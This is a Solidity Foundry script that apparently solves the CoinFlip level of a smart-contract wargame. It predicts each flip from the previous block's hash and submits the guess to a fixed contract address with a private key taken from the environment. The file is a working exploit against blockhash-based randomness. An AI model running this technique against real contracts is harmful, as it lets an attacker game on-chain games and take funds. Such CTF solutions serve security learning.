// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/03_CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side2 = coinFlip == 1 ? true : false;
        _coinFlip.flip(side2);
    }
}

contract CoinFlipAttack is Script {
    CoinFlip coinFlip = CoinFlip(0x2d4ba0228fcb71188066B246F71923C3D057f432);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player(coinFlip);
        console.log("Consecutive : ", coinFlip.consecutiveWins());
        vm.stopBroadcast();
    }
}
